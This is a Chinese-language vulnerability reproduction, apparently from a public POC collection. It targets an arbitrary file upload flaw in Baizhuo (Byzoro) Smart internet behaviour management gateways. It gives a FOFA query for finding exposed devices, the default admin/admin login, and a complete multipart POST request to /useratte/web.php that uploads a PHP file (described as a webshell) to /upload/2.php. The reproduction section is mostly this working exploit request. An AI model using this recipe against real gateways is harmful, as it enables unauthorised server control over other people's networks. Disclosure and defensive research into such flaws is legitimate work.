# 百卓Smart后台任意文件上传漏洞

# 一、漏洞简介
百卓Smart是一种系列品牌上网行为管理设备，多种应用功能集于一身，包括网络应用封堵、流量控制、链路负载均衡、网页分类阻断、上网内容审计、防火墙、VPN等。该网关后台存在任意文件上传漏洞，攻击者可通过该漏洞获取服务器控制权限。

# 二、影响版本
+ 百卓Smart

# 三、资产测绘
+ fofa`app="byzoro-Smart"`
+ 特征


# 四、漏洞复现
1. 使用默认账号`admin/admin`登录后台，获取登录后的`cookie`


2. 使用上一步获取的cookie替换上传webshell

```plain
POST /useratte/web.php? HTTP/1.1
Host: xx.xx.xx.xx
Cookie: PHPSESSID=6fca23a63591d8742708a4c50308f150
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like GeckoAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------42328904123665875270630079328
Content-Length: 611
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close

-----------------------------42328904123665875270630079328
Content-Disposition: form-data; name="file_upload"; filename="2.php"
Content-Type: application/octet-stream

<?php phpinfo(); ?>
-----------------------------42328904123665875270630079328
Content-Disposition: form-data; name="id_type"

1
-----------------------------42328904123665875270630079328
Content-Disposition: form-data; name="1_ck"

1_radhttp
-----------------------------42328904123665875270630079328
Content-Disposition: form-data; name="mode"

import
-----------------------------42328904123665875270630079328
```


3. 上传文件位置

```plain
/upload/2.php
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/znskqftupnfub0ea>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
